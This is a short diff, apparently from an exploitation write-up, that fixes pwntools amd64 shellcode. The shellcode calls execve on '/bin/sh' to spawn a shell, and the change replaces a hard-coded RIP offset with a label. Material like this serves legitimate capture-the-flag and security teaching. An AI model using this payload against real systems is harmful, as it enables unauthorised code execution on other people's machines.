@@ -60,9 +60,10 @@ context.arch = 'amd64'
 shellcode = asm("""
     xor rdx, rdx
     xor rsi, rsi
-    lea rdi, [rip+8]
+    lea rdi, [rip+binsh]
     mov rax, 59
     syscall
+binsh:
     .string "/bin/sh"
 """)
 ```
